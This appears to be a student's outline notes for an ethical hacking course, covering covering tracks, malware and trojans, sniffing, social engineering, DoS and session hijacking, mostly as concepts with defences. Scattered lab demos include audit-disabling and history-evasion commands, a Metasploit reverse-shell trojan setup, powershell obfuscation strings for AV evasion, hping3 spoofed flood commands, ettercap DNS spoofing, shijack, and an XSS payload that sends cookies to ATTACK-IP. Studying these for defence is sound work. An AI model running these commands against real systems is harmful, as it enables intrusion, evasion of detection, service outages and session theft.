2. Demonstrate techniques and tactics for clearing logs in a Windows and Linux Operating Systems
3. Explain the purpose of disabling auditing systems during an attack
4. Show how auditing systems could be disabled during an attack 
5. List and define common defensive maneuvers against attackers attempting to covers their tracks
- Once a threat actor has compromised a system or network only part of the battle has been won. It seems that now they would be scrambling to hide their presence and destroy evidence of their compromise or 'cover their tracks'. What are some of the main ways in which they try to accomplish this?
    - Disable Auditing systems
        - Stop recording/reporting activity that may alert admins to compromise 
    - Clearing Logs
        - Destroy evidences so that admins
            - Don't pick up on intruder presence
            - Thwart forensic investigation
- It really makes sense that an attacker would turn off systems that would be gathering evidence of their presence and activity. What are some methods used gathering evidence of their presence and activiy. what are some methods used by attackers and ethical hackes to disable auditing?
    - If Windows
        - Auditpol
            - auditpol /set /category:"system","account logon" /success:disable /failure:disable
- Fsutil (disable last access timestamp)
- fsutil behavior set disablelastaccess 1
- Disable Restore Points
- Attacker could trigger events that create a restore point
- Other
- Windows Hibernation file
- Windows Virtual memory (Page file)
- If Linux
- Disable bash history recording
- export HISTSIZE=0

## Module 7
**Malware Concepts And Components**
1. Define Malware
2. List the common malware types
3. Explain how malware spreads
4. List and define common components that make up, or are used by Malware
- We hear a lot about Malware these days, but i have trouble understanding that term. Can you help me out by defining malware and how that differs from other hermful software?
    - Malware Definition
        - Wmbrella term for any malicious software
    - Types of Malware
        - Trojans
        - Viruses
        - Worms
        - Ransomware
- It seems that malware does a pretty goos job of spreading. Why is that? What are the methods malware use to spread?
    - Email attachments/links
    - Software installs from untrusted sources
    - OS/Software vulnerabilities
- What are some of the components that are common to malware?
    - Downloaders
    - Droppers 
    - Obfuscators and Crypters
    - Payloads
    - Exploits
- OK. so what is the purpose of malware? Are hackers just bored and looking to cause chaos or are there more tangible reasons?
- Chaos? yes
- Cyber-crime (Money)
    - Stealing intellectual property
    - Destruction of data 
    - Spam
- Use compromised systems for DDoS or an a 'patsy' or a pivot

**APT**
1. Define APT
2. List and explain the common attributes of APT
3. Define and describe the phases of the APT lifecycle
- Today we're discussing APT and I've heard this term thrown around in the Cyber Security space quite a bit but there seems to be some mystery surrounding the idea. can you help clear this up a bit for us and define APT?
    - Advanced Persistent Threat
        - Can be used in reference to APT GROUPS and their capabilities sophistication and objectives
            - Fancy Bear (Russia, APT 28)
            - Lazaraus Group (N.Korea, APT 38)
            - https://attack.mitre.org/groups/
            - https://www.fireeye.com/current-threats/apt-groups.html
            - https://securelist.com/apt-trends-report-q1-2021/101967/
        - Also used to reference the malware used by these groups
- Let's dig into the details of those APT characteristics.
    - Goal Oriented
        - They are after sensitive information
            - That info could be...
                - PHI
                - PII
                - State Secrets
                - Intellectual Property
                - Financials
                - Research and Development
                - Political or Activists Statements
- Long-Term Access
    - No smash and grab!
    - They look to maintain access for as long as possible
- Patient
    - Which in turn makes them stealthy
- Highly Skilled
    - Develop custom Zero-day exploits
        - Advanced competency in multiple OSs, networking, programming, web, etc
        - Able to evade security controls
        - Attack from multiple vectors
        - Multi-staged attacks
    - Resourceful
        - Living off the Land
        - Command and Control access
- Now that we know what APT is and their attributes, let's turn our attention to the APT Lifecycle. What is the APT Lifecycle and what are its details we need to be aware of?
    - 'step-by-step' of phases that APT typically goes through when attacking a target
        - 6 phases
            - Preparation
                - Choosing and defining a target
                - Intelligence gathering
                - Acquire or create tools
                - Test for detection
            - Initial Intrusion
                - Malware deployment
                - Establish a connection
            - Expansion
                - Expand Access
                - Gather Creds
            - Persistence
                - Maintaining Access
            - Search and Exfil
                - Gather sensitive data
                - Exfil data to attacker controlled device
            - Cleanup
                - Covering Tracks
                - Persist undetected for as long as possible

**Trojans**
1. Define what a Trojan is
2. Describe the common indicators of a Trojan infection
3. Discuss how attackers commonly employ Trojans
4. List and define the common types of Trojans used by attackers
5. Discuss how to create and deploy a Trojan
6. List and define the common channels used by attackers to infect targets with Trojans
- What is a trojan and are there different types?
    - Legitimate software with a hidden malicious payload
        - RATs
        - Mobile Trojans
        - IoT/Botnet
        - Banking
        - DoS/DDoS
        - Backdoor
    - The purpose of using Trojans
        - Control over target host
            - Disable firewalls/IDS/etc
            - Install more malware
            - C2
            - Spying on users
            - Storage
        - Destruction of target host
            - DDoS
            - Theft
                - PII, PHI, Financials,
        - What are the methods of deploying trojans?
            - Droppers
                - Malware that downloads trojan
            - Downloaders
                - AV safe program that downloads trojan
                    - Target: Downloads and runs media-player_1.2_installer
                    - Parrot: serving up .sysconfig and listening with netcat on port 9999
    - Wrappers
        - Safe program with trojan attached
            - When safe program runs, trojan is also executed
                - Made linux trojan binary using Metasploit and freesweep (a minesweep game)
                - Parrot: use exploit/multi/handler ; set payload linux/x64/shell/reverse_tcp
                - Target: sudo dpkg -i /home/billy/Downloads/freesweep.deb
                    - Check for shell
    - Crypters
        - Obfuscations to make trojan FUD
- How do trojans infect targets?
    - Email
    - Covert Channels
    - Proxy Servers
    - Removable Media (USB)
- How do trojans evade AV?
    - Splitting the file
    - Changing file extension (windows hides known extensions by default)
    - Modify the trojan and you modify the known signature
    - Encryption
    - Don't use known trojans
        - Custom malware
- How are trojans made?
    - Off-the-shelf builder
        - DarkHorse Trojan Maker
        - ProRAT
        - Senna Spy Trojan Generator
    - Custom build

**Viruses And Worms**
1. Define Viruses and and Worms and explain their characteristics
2. List the phases of the Virus Lifecycle
3. List and define the common virus types
4. List and define how viruses and worms are able to infect computer systems
- What is the difference between viruses and worms?
    - Virus 
        - Malicious software that attackes itself to host file or program
        - Selt-replicating
            - It infects other programs or files
        - Requires human interaction to activate
    - Worm
        - Spreads independently throuh softqare vulnerabilities
        - Doesn't require human interaction
- What are typical goals?
    - Destruction/damage of systems
    - Cyber theft
    - Chaos!
    - Hacktivism
- What are symptoms of infection?
    - Poor system performance
        - Lack of disk space
        - Memory/CPU/Network utilization is high
    - System crashes
    - Missing data
- What are the stages of the Virus Lifecycle?
    - Design
        - Virus dev designs and develops new virus
            - Programming skills
            - Construction kits
    - Replication
        - Virus is released and spreads
    - Launch
        - User downloads and executes virus
    - Detection
        - Virus is discovered and analyzed
        - Virus attribute and specifics are cataloged

    - Incorporation
        - AV orgs add new virus defenses to their software
    - Execution of the damage routine
        - Removing viruses with AV
- What are some common virus types?
    - Boot sector
    - File 
    - Macro
    - Polymorphic
    - Metamorphic
    - Logic Bombs
    - Ransomware

**Fileless Malware**
1. Define Fileless Malware
2. List and describe Fileless Malware types and information vectors
3. Apply obfuscation to malware to bypass detection
- What is Fileless Malware?
    - Takes advantage of system vulnerabilities to inject malicious code into running processes
        - Malicious code runs system commands through PowerShell, WMI, bash etc 
            - This can be accomplished through
                - User visiting a malicious website
                    - Browser weakness
                - User running a malicious macro
                - Downloading a malicious file
- Types of Fileless Malware
    - 2 classification systems
        - Evidence Entry Point
    - Evidence
        - Type I: No file activity performed
        - Type II: Indirect file activity
        - Type III: Files required
    - Entry Point
        - Exploits
            - File-based
                - Initial entry vector is a file
                - Payload is fileless
            - Hardware
                - Malware infects Firmware of...
                    - Network Interface Cards
                    - Hard Drives
                    - CPU
                    - USB
                    - Hypervisor
            - Execution and Injection
                - File-based
                    - Simple executable as first stage
                        - 2nd stage downloaded and launched into memory, or injected into other legit process
            - Macro-based
                - VBA used to create malicious macro
                - Macro is enabled by user
                - Macro runs malicious code
            - Script-based
                - WMI, PowerShell, Bash, Python, javascript, vbscript
            - Disk-based
                - Boot record infection
- What is the process behind a fileless malware infection?
    - Point of Entry
        - Memory exploits
            - ie: eternalblue
        - Malicious Website
            - ie: malicious script execution, client-side attacks
        - Phishing Mail
            - ie: malicious attachment
        - Malicious Document
    - Code Execution
        - Script-based
            - Powershell, WMIC, bash, VBScript, etc
        - Code Injection
            - DLL injection
            - Process hollowing
    - Persistence
        - Registry entries
        - WMI
        - Scheduled task
    - Achieving Objectives
        - Recon
        - Cred grab
        - Sensitive data exfil
        - Cyber Espionage
- With so many protections available, how does Fileless malware sneak passed AV?
    - Mixed case
    - Insertion of characters
        - Commas and Semicolons
            - Interpreted as whitespace in Windows
        - Carat
            - Used for escaping
            - Use double carats for more effectiveness
                - `cmd.exe /c p^^o^^w^^e^^r^^s^^h^^e^^l^^l.exe`
    - Custom Environmental Variables
        - `set a=Power && set b=Shell && %a:~0,5%%b:~0,5%`
    - Built-in Environmental Variables
        - `%CommonProgramFiles% = C:\Program Files\Common Files`
            - `cmd.exe /c "%CommonProgramFiles:~3,1%owershell"`
    - Double Quotes
        - Argument Delimiter
            - Used to concatenate
                - `cmd.exe /c P""owe""r""Sh""e""ll`
- DEMO
    - Parrot: LPORT = 443, HTTP on 8000, serving /home/dlowrie/Tools/Shells/Powershell
    - Target: Run script update_script.cmd

**Malware Analysis**
1. Define sheep dippigng
2. Explain the basic malware analysis concepts, types and procedures
3. Identify common static and dynamic malware analysis techniques 
- Basic details of Malware Analysis
    - Discovery, Study, and Reporting of malware and its attributes
        - Discovery
            - AV alerts
            - Monitoring
                - Sheep Dipping
                    - Comes from Farming.
                        - Sheep are treated as if they were infectious until they were disinfected
                            - 'Cyber Sheep'
                                - Computers, mobile devices, USB drives, email attachments, software, etc
                                    - Treated as infectious until...
                                        + Scanned with AV(multiple)
                                        + Monitored network activity
                                        + Monitored processes
                                        + Permissions checked
                                        + Monitored Registry and Kernel
                                        + Study
                                        - What is this malware doing? (aka 'reverse engineering')
                                        + Types of Analysis
                                        1. Static Analysis (aka code analysis)
                                        + File hashes
                                        - Virus Total
                                        - Hybrid Analysis
                                        + Portable Executable(PE) Files
                                        + Suspicious strings in code
                                        + Obfuscations
                                        + File dependencies
                                        + Disassemble malware code
                                        2. Dynamic Analysis (aka behavioral analysis)
                                        + Disk/CPU/Memory/Network activity
                                        - Create command and control channel
                                        - Exfil data
                                        - Destroy data
                                        - DoS/DDoS
                                        - Spying
                                        - Testing Environment
                                        + Isolation is key
                                        - Dedicated physical system
                                        - Virtualization on dedicated system
                                        + Disable "shared folders" (SHOW THIS IN VMWARE)
                                        + Configure "Guest Isolation"
                                        - Isolated network
                                        + VLAN
                                        + Firewall
                                        + Host-only
                                        + Install malware analysis tools
                                        - Monitors
                                        - Debuggers
                                        - Report
                                        + Attributes are recorded
                                        - IoC, Hash Values, sophistication level, exploited vulns, objectives,
                                        entry point
                                        + Signatures created
                                        + Alerts created
                                        + Attribution (if possible)
                                        + Lessons Learned

**Malware Countermeasures**
1. List common tools and techniques used in defense of malware
- What are some countermeasures we can employ to help us defend against malware?
    - Updates/Patches
        - Defined
            - Policy
                - Schedule
                - Procedure
                    - In-band
                    - Out-of-band
    - Run AV, Anti-Malware, EDR solution
        - Update signatures and engine REGULARLY!
        - Run scans REGULARLY!
        - Enable Real-Time Protections
    - End-User Security Awareness Training
        - Don't click links in email
        - Don't download/run email attachments
            - Run AV scan at least
        - Enable 2FA/MFA
        - For Admins
            - Threat feeds
            - Threat modeling
            - Vulnerability assessments/ Pentesting
    - Backups
        - Defined
            - Policy
                - Schedule
                - Procedure
                    - In-band
                    - Out-of-band
    - Logging and Monitoring
        - Network Traffic
        - IPS
        - File Integrity
        - System Access/Authentication
        - Use a syslog/SIEM Solution
            - Splunk
    - BLOCKING
        - Apps from untrusted sources
        - Blacklisting/Whitelisting
        - Firewalls, IDS
        - Disable PowerShell, WMI, Macros, JavaScipt etc
    - Others
        - Principall of Least Privilege
        - Defense-in-Depth
        - Disable unnecessary protocols and services
        - Use a system hardening guide, security framework

## Module 8
**Network Sniffing Basics**
1. Define Network Sniffing
2. Explain the process of network sniffing
3. Explain the usefulness of network sniffing to an attacker
4. Describe how an attacker can sniff a switched network
5. List and describe common sniffing attacks against network switches
- Sniffing Concepts and Tools
    - Capturing network traffic and inspecting its contents
        - Promiscuous Mode
            - Wireshark
            - TCP-Dump
            - Mobile apps
        - SPAN port aka "Port Mirroring"
        - Hardware Sniffers
            - https://www.gigamon.com/products/access-traffic/network-taps.html
- Sniffing Types
    - Passive
        - No activity to solicit or generate further network traffic
    - Active
        - Activity which generates more network traffic
            - Spoofing
            - Poisoning
            - Host Compromise
                - Compromised host used as internal sniffer
            - Malware
- Sniffing Switched Networks
    - Hubs vs. Switches
    - Switching
        - Switch Ports
        - Content Addressable Memory (CAM) Table
             - VLAN ID
            - MAC Address
            - P ort ID
            - Learning Mode
                - Broadcasts out all ports
            - CAM Attack
                - Flooding the switch with fake MACs will fill up the CAM
                    - Learning Mode becomes the default mode
                        - Switch fails open to Learning Mode
                    - *macof CAM* flooding tool
                        - Look at `macof` man page
            - Switch Port Stealing
                - Is a 'MAC spoofing', 'Flooding' and 'Poisoning' attack against switch
                    - Flood switch with spoofed MAC via ARP
                        - MAC Spoofing Tools
                            - *macchanger*
                            - Advanced Properties of Network Interface in Windows
                                - Labled 'Network Address'
                            - Windows Registry entry
                            - Technitium MAC Address Changer
                                - https://technitium.com/tmac/
                    - Race real host for control over switch "truth"
                    - Switch is fooled or 'Poisoned', data is sent to attacker
    - Other Switch-based attacks
        - VLAN Hopping
            - Allows you to access to other VLANs
                - Attacker can now sniff that traffic
            - Accomplished through...
                - Switch Spoofing
                    - Attacker-controlled switch
                        - Connects to target network
                            - Forces trunk link to attacker switch
                - or Double-Tagging
                    - Attacker creates Ethernet Frames with 2 802.1Q tags
                        - Inner tag
                        - Outer tag
                    - Target switches receive malicious Frame
                        - Strips off outer tag
                            - Forwards Frame using Inner tag through all trunk interfaces
        - STP Attack
            - Attack switch is set to gain Root-Bridge status
                - All traffic now flows through Root-Bridge and can be sniffed

**DHCP Sniffing Attacks**
1. Descibe how DHCP works
2. List and describe common vulnerabilities and attacks against DHCP
- How does DHCP work?
    - DORA
        - Discover
        - Offer
        - Request
        - Acknowledgment
            - Demo: dhclient and wireshark
- Common attacks?
    - Rogue DHCP
        - Connects targets to rougue network (maybe, gotta win the race or trick user)
        - DHCP sets...
            - IP addresses
            - DNS info
            - Gateways info
    - Results in
        - DoS attacks
            - Users that connect to rogue DHCP have no actual network access
        - Set's attacker as default gatway
            - Gateway bound traffic is intercepted by attacker
                - MiTM can occur (Forward traffic to real gateway)
        - Set's attacker as DNS
            - Attacker can serve fake websites
                - Credential Harvesting
                - Sensitive info stealing

**ARP Poisoning**
1. Describe how ARP works
2. List and describe common vulnerabilites and attacks against ARP
- How does ARP work?
    - Resolves IP to MAC
    - Helps hosts find other hosts
        - ARP Broadcasts
            - Wireshark demo (Who has this IP? Tell this device)
        - ARP Table
            - Dynamic ARP
            - arp -a
- Attacking ARP
    - ARP Cache Poisoning or ARP Spoofing Attack
        - Attacker can go after the switch
        - Attacker can go after the host
            - Threats
                - Sniffing
                - MitM
                - Session Hijacking
                - DoS
- ARP Poisoning Tools
    - BetterCAP
    - Ettercap - DEMO
    - dsniff
    - arpspoof
- Defenses?
    - DHCP Snooping and Dynamic ARP Inspection
        - Distrusts ARP packets until DHCP Snooping has verified it
    - Use STATIC ARP
    - ARP Attack detection tools
        - XARP
        - ARP AntiSpoofer

**DNS Poisoning**
1. List and describe common DNS Poisoning attack techniques and tools
- DNS basics
    - Resolve domains to IP
        - Windows DNS Lookup order
            - Checks self (am I the device I'm looking for?)
            - Checks DNS Resolver Cache
            - Checks the Hosts file (do I already know where this is?)
            - Checks with DNS Servers
- DNS Attacks
    - Modifying hosts DNS info
    - Tricks hosts to query malicious DNS
        - Host file entries
        - Malicious proxy
- DNS cache poisoning
    - Tricking clients into thinking that attacker is legit DNS
        - Redirect targets to malicious sites
    - DEMO: Ettercap for DNS poisoning
        1. Modify `etter.dns` file to have fake A records
        - Copy from Kali `/Tools/fakeArec.txt`
        - Change IP to match IP of bWAPP
        1.` ettercap -T -q -i eth0 -P dns_spoof -M arp /10.0.0.225//`
        - -T = Text Only
        - -q = Quiet. Do not display packet contents
        - -i = Set interface
        - -P = Choose plugin to use
        - -M = Perform MITM
        - /192.168.241.130//
            - /IPv4/IPv6/Port
        1. Browse to facebook from target
        2. Login to facebook/bWAPP and see user/pass info in Kali
- DNS Poisoning and Spoofing Tools
    - Ettercap
    - DNS Spoof
    - DerpNSpoof

**Sniffing Defenses**
1. List and detail common defensive tactics and tools used to detect and prevent common sniffing attacks
- Sniffing Defenses?
    - Encryption
    - Physical security (no attaching hardware sniffers)
    - Static ARP and/or IP
    - Use IPv6
    - IDS to detect sniffing
    - Promiscuous mode scanner
- Switch based attacks
    - Defenses?
        - Switch Port Security (port-security)
        - DHCP Snooping and Binding Tables
            - Records info on untrusted devices (MAC,VLAN,IP,Lease Time, etc)
                - Works like a firewall between trusted and un-trusted devices
        - Port-based NAC
        - Dynamic ARP Inspection
        - Disable Trunk auto-negotiation
            - For both access ports and trunk ports
        - Don't use the Default VLAN (double-tagging)
        - Change Native VLANs to unused ID (double-tagging)
        - Force Native VLAN tagging (double-tagging)
        - STP Attacks
            - BPDU Guard (disables unauthorized ports after sending BPDUs)
            - Root Guard (ensures status of the current Root-Bridge)
- DNS Defenses
    - DNSSEC
    - Block outbound traffic from UDP 53
    - Restrict external DNS queries
        - DNS Sinkhole
    - Encryption of DNS traffic

## Module 9
**Social Engineering Concepts and Attacks**
1. Define Social Engineering
2. Catalog common targets and impact of social engineering
3. List and explain the phases of a Social Engineering Attacks
4. Define the types of Social Engineering
5. List common used Social Engineering tools and techniques
6. List and defenses and countermeasures to help combat Social Engineering attacks
- What is SE?
    - Hacking people
        - Getting them to give access to data/info/systems/areas they shouldn't
        - Basically lying to them to prey upon their ignorance and/or fear
- How do successful SE attacks impact organizations?
    - Financially
    - Public trust
    - Legal action
    - Permanent stopping of business
- Common SE targets?
    - Help desk / Workstation support / Tech Support
    - Admins
    - C-Level
    - Really, basically everyone!
- You said that SE was 'hacking people' by lying to them. Can we have more
    - detail about how that works?
        - Framing/Pretexting
            - Negative
                - Authority
                - Force
                - Social Pressure
                - Rarity
                - Urgency
                - Greed
            - Positive
                - Trust
                - Social Acceptance
                - Helpfulness
- What are the Phases of a SE attack?
    - Research target org
    - Select target employee
    - Establish and Develop a relationship
    - Exploit the Relationship
- SE Types
    - Human SE
        - Piggybacking
        - Tailgating
        - Dumpster diving
        - Elicitation
        - Vishing
        - Impersonation
        - Eavesdropping
        - Shoulder surfing
    - Computer SE
        - Phishing
            - Spear Phishing (specific person or group in an org)
            - Whaling (specific C-levels)
        - Spam
        - Messengers/Chat (aka Spimming)
    - Mobile SE
        - Fake/Malicious Apps
            - Fake Security Apps
            - Legit Apps that have been repackaged
        - SMiShing
- SE Tools
    - SEToolkit
    - ShellPhish
    - King Phisher
    - Phone/Email
- SE countermeasures
    - End-User Security Awareness Training
        - Phishing email
            - Samples from TEAMS
        - Password Policies
        - 2FA/MFA
        - Badges/ID
        - Locks
        - Phishing Tests
        - Proper garbage disposal
        - Visitor check-in

**Insider Threats**
1. Define Insider Threat 
2. List the types of Insider Threats
3. Explain the dangers of Insider Threats
4. Describe the Goals and motivations behind Insider Threats
5. Uncover the presence of an Insider Threat based on behavioral indicators
- Let's dive into the concept of the Insider Threat.
    - Insider = employee or trusted person
    - Threat = Potential for negative
        - Insider can cause damage for long periods of time with detection
            - Due to their inherent trust
        - Easy to pull off
        - Difficult to prevent
        - Attribution can be difficult
- What types of Insider Threats
    - Malicious insider (Disgruntled/Terminated Employees)
    - Negligent/Accidental Threat
    - Professional Insider
    - Compromised Insider(Blackmail)
- Why would someone do this?
    - Money
    - Revenge
    - Competitive advantage
    - Hacktivism
    - Coercion
- Insider threat Indicators
    - Discovery of data exfil
        - Convert Channel
            - IM/Chat
            - FTP
            - Online storage
        - Email
    - Multiple logins from different devices
    - Attempting to access or has accessed restricted areas
    - Strange working hours
    - Behavioral abnormalities
    - Odd or suspicious network activity
    - Possession of sensitive data

**Identity Theft**
1. Define Identity Theft
2. List the common types of Identity Theft
3. Specify common Identity Theft techniques
4. List common indicators of Identity Theft
- Define Identity Theft
    - Impersonation of and take-over of a person's identity
- Why would someone do this?
    - Crime 
        - Fraud
        - Theft
            - Credit/Loan Fraud
            - Banking/Ckeck Fraud
            - Steal pension/tax/annuity checks
            - Sell stolen Identity
            - Online purchases
            - Framing real person for crimes
    - Hidding from X
- What forms of ID are targeted?
    - Driver's License
    - Social Security Number
    - Banking info/Credit/Debit Card info
    - Insurance info
    - Tax info
    - Children's Personal info
- How is this info gathered?
    - Theft of personal items
        - Wallet/Purse
        - Computer
        - Phone
        - Paper/Electronic files
    - OSINT
    - Social Engineering
        - Phising, Shoulder Surfing etc
    - Keyloggers
        - Mail Theft
- How can we know if we're become a victim?
    - Un-recognized financial activity
    - Stop receiving mail
        - Bills
        - Statements
    - Start receiving mail(Unfamiliar)
        - Bills
        - Statements
    - Contacted by devy collectors
    - Tasex filed
    - Credit Reporting
    - Stop receiving benefits
    - Unjustly denied insurance claims

## Module 10
**DoS and DDoS Attacks**
1. Define DoS and DDoS attacks
2. List and explain DoS attacks types
3. List and define the different DoS/DDoS categories
4. Identify commonly used DoS/DDoS attack tools for different platforms
- What is a DoS attack?
- What is th difference between DoS and DDoS?(attack types)
- Common attack techniques?
    - Categories
        - Volumetric (depletion of bandwidth, bits-per-second)
            - Amplification attacks
                - UDP Flood
                - ICMP Flood
                - Ping of Death
                - Smurf
                - Pulse Wave
        - Protocol (Packets-per-second)
            - SYN Flood
            - ACK Flood
            - Fragmentation
        - Application Layer (Resource starvation, requests-per-second)
            - SlowLoris
            - UDP app-layer flood
        - Multi-Vector
            - Volumetric + Protocol + Application-Layer
        - Permanent DoS
            - Bricking
            - Phlashing
        - Reflective
            - Hides the true source of attack
            - Distributed Reflection DoS or DRDDoS
                - Multiple distributed attacking devices
                - Utilizing Reflective DoS attacks
- DoS/DDoS Tools
    - High/Low Orbit Ion Cannon
        - LOIC has mobile version
    - hping3
    - Metasploit

**Volumetric Attacks**
1. List and describe common types of Volumetric DoS/DDoS attacks
- Volumetric Attacks
    - Amplification attacks
        - UDP Flood
            - Attacker floods target with UDP packets from spoofed IP
            - Target checks for UDP service
            - Target responds with 'Destination Unreachable' error
            - Legit traffic can't access server
                - `hping3 --flood --spoof 192.168.241.133 --udp -p 53 192.168.241.130`
            - ICMP Flood
                - Reflection networks are useful here
                - Requests and Replies saturates the network
                    - `hping3 --flood --spoof 192.168.241.133 --icmp -p 53 192.168.241.130`
            - Ping of Death
                - Oversized packet
                    - Size greater than 65535 bytes
                        - System crashes
            - Smurf & Fraggle
                - DDoS target with ICMP echo replies
                    - Send ICMP echo request to network broadcast address with spoofed source IP of target
                    - If network allows directed broadcast requests, all hosts on network will respond to target with ICMP echo replies
                        - `hping3 --flood --spoof --icmp 192.168.241.130 192.168.241.255`
                - Fraggle
                    - Similar to Smurf
                        - UDP instead of ICMP
                        - Targets ports 7(Echo) and 19(CHARGEN)
        - Pulse Wave
            - Attacker sends data to target for every 10 minutes
            - Attack pulses(attack session) can last for hours or days
            - Pulses are 300Gbps

**Protocol Attacks**
1. List and describe common types of Protocol DoS/DDoS attacks
- Give us some info about common Protocol-based DoS/DDoS attacks.
    - SYN Flood
        - Remember TCP 3-way handshake
            - What does the SYN packet do? (starts to establish a connection)
                - The target must track partially open connections (listen queue)
                    - Listen Queue tracks for at least 75 seconds
        - Attacker sends multiple SYN request
            - Never responds to the SYN/ACK (SYN/ACK flood is similar to this attack)
                - `sudo hping3 --syn --flood -p RPORT RHOST`
                - Target's listen queue is overwhelmed
    - Target can no longer service connection requests
        - ACK / PSH-ACK Flood
            - Send a bunch of ACK or PSH-ACK packets to target
    - LOIC DEMO (tcp attack is a PSH-ACK attack)
        - Fragmentation
            - Attacker sends large number of fragmented packets
                - Target's resources are consumed as it is overwhelmed trying to reassemble fragmented packets
                    - Attack is more effective if fragments are randomized
            - Can bypass firewalls/IDS/IPS solutions

**Application Layer Attacks**
1. List and describe common types of Application Layer DoS/DDoS attacks
- Application Layer (Resource starvation, requests-per-second)
    - HTTP
        - Web services utilize HTTP Methods
            - GET 
            - POST
        - attacker overwhelms Server by flooding it with GET/POST requests
            - LOIC DEMO
        - Unintentionaly attack
            - Death of Michael Jackson
                - Stopped, slowed and even crashed
                    - Google
                    - Twitter
            - News/Link sites
                - Link goes viral and site gets overloaded by visits
                    - Reddit Hug of Death
                    - Digg Effect
    - SlowLoris
        - METASPLOIT DEMO
            - Read description in 'info' section
    - UDP App-layer flood
        - UDP Flood attacks against services like..
            - TFTP
            - VoIP
            - Steam Protocol
            - RPC
            - SNMPv2
            - NetBIOS

**Botnets**
1. Define Botnets and their attributes
2. Describe what a typical botnet setup looks like
3. Explain how a botnet attack network is built
- What is a botnet?
    - A dispersed group of compromised and remotely controlled systems
        - Could be any device
    - A portmanteau of roBOT + NETwork
    - Live botnet threats map: https://www.spamhaus.com/threat-map/
- What is their purpose?
    - Typically employed to do...
        - Cypto-mining
        - Attack platform for cybercrime
        - Spread malware
        - Influencing online games and polls
        - DDoS attacks
    - Affiliate Networks
        - Botnets joining forces
            - More effective
    - https://www.imperva.com/blog/bad-bot-report-2021-the-pandemic-of-the-internet/
- How do hackers choose targets to become bots?
    - Scan networks for vulnerabilities
        - Random hits
        - Pseudo-random permutation list of IPs
        - Local Subnets
            - Already infected devices scan their local networks for other vulnerable targets
                - Infected bots can scan for internet facing targets as well
- Common ways compromised hosts download attack toolkits
    - Autonomously
        - Attacker copies it directly to target
            - Target scans for more targets and repeats the cycle
    - No intermediary source required
    - Back-Chaining
        - Attacker exploits target
            - Target then requests toolkit from Attacker
                - Repeat
    - Central Source
        - Intermediary server acts as toolkit repository for bots

**DoS and DDoS Countermeasures**
1. List and explain the common DoS/DDoS detection and mitigation techniques adn strategies
2. List and explain common DoS/DDoS protection mechanisms and appliances
- Countermeasures
    - Activity Profiling
        - Network activity baselines
        - Traffic increases are indicators of attack
    - Sequential Change-Point Detection
        - Algorithmic detection of DoS
            - Cumulative Sum Algorithm
        - Wavelet-Based Signal Analysis
            - Spectral analysis of an input signal
                - Spectral Window energy is analyzed for anomalies
    - Strategies
        - Absorb
            - Scale up resources
        - Degrade
            - Shut off non-critical resources
        - Shut Down
            - Turn off service
        - Deflect
            - Use decoys(honeypots/ honeynets) to attract the attacks
        - Prevent / Mitigate
            - Ingress/ Egress Filtering 
            - TCP Intercept
                - Routers can validate connection request
                    - Stops SYN floods
            - Rate limiting or QoS
            - Blackholing
            - Sinkholing
    - What about botnet protection?
        - Blackholing
        - ISP protection
        - Cisco IPS Source IP Reputation block them
    - Any other protections?
        - Hardware appliances
            - https://www.checkpoint.com/quantum/ddos-protector/
        - Software
        - Services
            - https://www.fortinet.com/products/ddos/fortiddos
        - ISP or 3rd-party service
        - Updates/Patches
        - Encryption
        - No unused/unnecessary ports/services

## Module 11
**Session Hijecking Concepts**
1. Define Session Hijecking
2. Explain why session hijecking is successful
3. List and define the common session hijacking types
- What is session hijacking?
    - Take over of a TCP coversation
    - Impersonate an authenticated user
        - HTTP
        - TCP
            - MitM
- Why does this work?
    - Sessions that never time out
    - IDs are easily guessed
    - No security around IDs
    - No lockouts for invalid session IDs
- Types
    - Passive
        - Hijack session and just sniff network traffic
    - Active
        - Session take-over
            - Attacker becomes the user and is actively doing things as them
                - Application Layer Hijacking
                    - Taking over web-app user session
                        - Session IDs = gold!
    - Network Layer Hijacking
        - Intercepting and taking over TCP/UDP sessions
            - ARP Spoofing MitM 

**Network Level Session Hijacking**
1. List and define common Network Level Sessions Hijacking Attacks
- What are some of the common Network-Level Session Hijacking attacks we should be aware of?
    - Blind Hijacking
        - Kind of a 'hail Mary'
            - Attacker must correctly guess/predict the next Initial Sequence Number(ISN) of the device attempting to establish a session/connection
                - Attacker can then inject malicious stuff
                    - Attacker cannot see responses (aka BLIND)
    - UDP
        - Attacker intercepts UDP replies
        - Modifies UDP replies and sends them on to intended endpoint
        - Modification is difficult to detect
        - UDP doesn't have the error correcting like TCP
    - TCP
        - DEMO: Hijack Telnet session
        1. Establish telnet session between client and server
        2. Start Ettercap GUI ARP spoof attack
        - Sniff > Unified Sniffing
        - Targets > Select Targets
        - Mitm > ARP Poisoning > Sniff Remote Connections
        3. Find session information with Wireshark
        - Look for Client to Server connection
        - Record Source IP/Port && Destination IP/Port
        4. Use shijack to hijack the session
        - `shijack-lnx eth0 10.0.0.200 48895 10.0.0.165 23`
        5. Wait for shijack to capture SEQACK
        6. Now you can run any command as that victim (first try wont work)
        - This specific example is a BLIND attack
            - We can't see the response from the target
    - RST Hijacking
        - Sniff network for session packet with ACK flag set
        - Also need the Source/Dest IP/Port, Sequence number and Acknowledgement number
        - If you can correctly guess the next sequence number to the server...
            - You can reset the session by sending RST packet
                - Allowing you to hijack the session
    - MitM Packet Sniffing
        - DEMO
            - Use Ettercap to ARP poison Bee-box and Websploit2018
            - Start wireshark
            - Bee-box is playing the Target
                - Bee-box login to to Websploit2018/bwapp
            - Check Wireshark for session token
            - Insert new token into Parrot browser and refresh page
                - User should have changed from Bee to AIM

**Application Level Session Hijecking**
1. List and define common Application-Level Session Hijacking attacks
- What t are some of the common App-Level Session Hijacking attacks we should be aware of?
    - Sniffing
        - Just sniff network traffic and intercept session tokens/IDs
    - MitM
        - Employ MitM to enable traffic sniffing
    - MitB
        - Malware-based approach
            - Malware hooks the browser and intercepts session info
    - XSS
        - DEMO
            - Reflected
            - DOM-based
            - Stored | Persistent
                - Attacker setup:
                    - Setup HTTP listener with Python
                    - <script>new Image().src="http://ATTACK-IP/bogus.php?output="+document.cookie;</script>
                - Target then browses to 'blog'
                    - Target token shows up in Attack HTTP log
                - Attacker then copies token and logs into Web site
                    - Ctrl-Shift-I to start browser Dev tools
                        - Storage
                            - Paste token into PHPSESSID value
                                - Reload page (you are now logged in as AIM)
    - CRIME
        - Compression Ratio Info-Leak Made Easy
            - Exploits a vulnerability in the use of compression features found in
                - HTTPS/SSL/TLS
                - SPDY (pronounced 'speedy')
    - Session Fixation and Donation
        - Sites that transmit Session tokens via the URL are susceptible
            - Fixation
